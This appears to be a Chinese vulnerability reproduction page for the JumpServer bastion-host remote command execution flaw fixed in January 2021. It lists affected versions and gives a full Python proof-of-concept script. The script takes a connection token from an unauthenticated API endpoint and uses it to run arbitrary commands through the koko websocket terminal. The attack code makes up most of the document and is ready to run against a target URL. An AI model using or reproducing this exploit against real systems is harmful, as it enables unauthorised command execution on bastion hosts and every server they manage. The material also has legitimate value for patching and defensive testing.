# JumpServer 远程命令执行漏洞

## 漏洞描述

JumpServer 是全球首款完全开源的堡垒机, 使用GNU GPL v2.0 开源协议, 是符合4A 的专业运维审计系统。 JumpServer 使用Python / Django 进行开发。2021年1月15日，阿里云应急响应中心监控到开源堡垒机JumpServer发布更新，修复了一处远程命令执行漏洞。由于 JumpServer 某些接口未做授权限制，攻击者可构造恶意请求获取敏感信息，或者执行相关操作控制其中所有机器，执行任意命令。

## 漏洞影响

```
JumpServer < v2.6.2
JumpServer < v2.5.4
JumpServer < v2.4.5
JumpServer = v1.5.9
```

## 漏洞复现

详情参考：https://www.o2oxy.cn/2921.html

poc.py：

```python
# -*- coding: utf-8 -*-
# import requests
# import json
# data={"user":"4320ce47-e0e0-4b86-adb1-675ca611ea0c","asset":"ccb9c6d7-6221-445e-9fcc-b30c95162825","system_user":"79655e4e-1741-46af-a793-fff394540a52"}
#
# url_host='http://192.168.1.73:8080'
#
# def get_token():
#     url = url_host+'/api/v1/users/connection-token/?user-only=1'
#     url =url_host+'/api/v1/authentication/connection-token/?user-only=1'
#     response = requests.post(url, json=data).json()
#     print(response)
#     ret=requests.get(url_host+'/api/v1/authentication/connection-token/?token=%s'%response['token'])
#     print(ret.text)
# get_token()
import asyncio
import websockets
import requests
import json
url = "/api/v1/authentication/connection-token/?user-only=None"

# 向服务器端发送认证后的消息
async def send_msg(websocket,_text):
    if _text == "exit":
        print(f'you have enter "exit", goodbye')
        await websocket.close(reason="user exit")
        return False
    await websocket.send(_text)
    recv_text = await websocket.recv()
    print(f"{recv_text}")

# 客户端主逻辑
async def main_logic(cmd):
    print("#######start ws")
    async with websockets.connect(target) as websocket:
        recv_text = await websocket.recv()
        print(f"{recv_text}")
        resws=json.loads(recv_text)
        id = resws['id']
        print("get ws id:"+id)
        print("###############")
        print("init ws")
        print("###############")
        inittext = json.dumps({"id": id, "type": "TERMINAL_INIT", "data": "{\"cols\":164,\"rows\":17}"})
        await send_msg(websocket,inittext)
        for i in range(20):
            recv_text = await websocket.recv()
            print(f"{recv_text}")
        print("###############")
        print("exec cmd: ls")
        cmdtext = json.dumps({"id": id, "type": "TERMINAL_DATA", "data": cmd+"\r\n"})
        print(cmdtext)
        await send_msg(websocket, cmdtext)
        for i in range(20):
            recv_text = await websocket.recv()
            print(f"{recv_text}")
        print('#######finish')


if __name__ == '__main__':
    try:
        import sys
        host=sys.argv[1]
        cmd=sys.argv[2]
        if host[-1]=='/':
            host=host[:-1]
        print(host)
        data = {"user": "4320ce47-e0e0-4b86-adb1-675ca611ea0c", "asset": "ccb9c6d7-6221-445e-9fcc-b30c95162825",
                "system_user": "79655e4e-1741-46af-a793-fff394540a52"}
        print("##################")
        print("get token url:%s" % (host + url,))
        print("##################")
        res = requests.post(host + url, json=data)
        token = res.json()["token"]
        print("token:%s", (token,))
        print("##################")
        target = "ws://" + host.replace("http://", '') + "/koko/ws/token/?target_id=" + token
        print("target ws:%s" % (target,))
        asyncio.get_event_loop().run_until_complete(main_logic(cmd))
    except:
        print("python jumpserver.py http://192.168.1.73 whoami")
```

